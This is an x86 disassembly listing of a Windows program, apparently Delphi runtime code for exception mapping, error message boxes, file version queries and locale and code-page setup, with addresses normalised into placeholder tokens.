call sub_404500
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4042a8
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_404034
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408688
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4042a8
inc ebx
jmp r-xdata
mov eax esi
call sub_4042a0
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408688
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4042a8
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4042a8
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4042a8
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_4041c8
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4042a8
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_4041c8
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_4042a8
sub_40b240
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b234
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c258
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_4085ac
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_40507c
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_4031e0
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408bd0
mov eax [ ebp - 0x4 ]
call sub_408548
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_4044a0
mov ebx eax
mov eax ebx
call sub_408548
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b3c8
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b240
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_40507c
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402afc
call sub_402824
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408548
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b490
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404034
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_40b4cc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b526
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408c10
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_404034
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b52d
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
add esp 0xfffffff0
call sub_4035b4
sub_40b52d
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_40b54c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405b10
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_40b588
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b5f4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405b10
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408c10
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_404034
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b5fb
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404004
retn
add esp 0xfffffff0
call sub_4035b4
sub_40b5fb
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_40b648
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_402898
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b588
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40b6a8
lodsb [ esi ]
mov dh 0x40
add [ esi ] cl
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_403a1c
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b490
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b648
mov edx eax
sub_40b71c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b7b8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404078
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b7bf
lea eax [ ebp - 0x20 ]
call sub_403fe0
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_40b80c
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40b8a4
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40ba5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_404250
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_408418
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ba66
lea eax [ ebp - 0x170 ]
call sub_403fe0
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_404004
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_40ba70
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bb2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40b80c
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b490
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
push ebp
call sub_40b8a4
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bb32
lea eax [ ebp - 0x10 ]
call sub_403fe0
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
mov ebx eax
sub_40bb4c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40bb3c
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40b88c
mov eax [ rw-data ]
mov [ eax ] sub_40ba70
mov eax sub_40b7d8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40b7f4
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40bbd0
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403290
xor eax eax
mov [ rw-data ] eax
sub_40bc50
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_404250
sub_40bce0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40bdb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404078
lea eax [ ebp - 0x8 ]
call j_sub_4044ac#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4044a0
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bdbd
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
mov eax ebx
call sub_4026bc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40bd99
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4044a0
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40bdcc
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40be44
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4044a0
mov edx esi
dec edx
call sub_40bdcc
sub_40be80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4042a0
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40bea8
pop esi
pop ebx
retn
mov eax ebx
call sub_4042a0
mov esi eax
sub_40bea8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4042a0
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c0b8
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40bf00
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_4042a0
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c0b8
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c0b8
dec eax
mov ebx eax
sub_40bf90
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4042a0
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40bf00
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4042a0
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40bff4
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4042a0
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_4042a0
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40bf00
mov eax esi
call sub_4042a0
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_4042a0
mov [ esp ] eax
jmp r-xdata
sub_40c07c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_4044a0
add eax esi
dec eax
call sub_40c054
sub_40c0b8
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_4044a0
add eax ebx
dec eax
call sub_40c054
add eax ebx
sub_40c0f4
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_4044a0
push eax
mov eax esi
call sub_4044a0
mov ebp eax
mov eax ebp
pop edx
call sub_40c1b8
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c12c
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_407d3c
mov eax esi
call sub_4042a0
mov ebp eax
mov eax edi
mov edx ebp
call sub_40462c
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_4044ac
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_4044ac
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_4044ac
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40c1b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408548
mov [ esp ] eax
mov eax ebp
call sub_408548
mov edi eax
mov edx ebp
mov eax esi
call sub_4086e0
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40be68
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_4086e0
mov ebx eax
inc ebx
sub_40c258
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c280
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c280
test eax eax
jne r-xdata
sub_40c280
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4086cc
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40be68
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_4086cc
mov edi eax
test edi edi
jne r-xdata
sub_40c2c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c324
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_404250
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_408090
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c32b
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
sub_40c334
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c2c0
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c3ac
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c394
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c334
pop ecx
push ebp
call sub_40c334
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402dd0
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
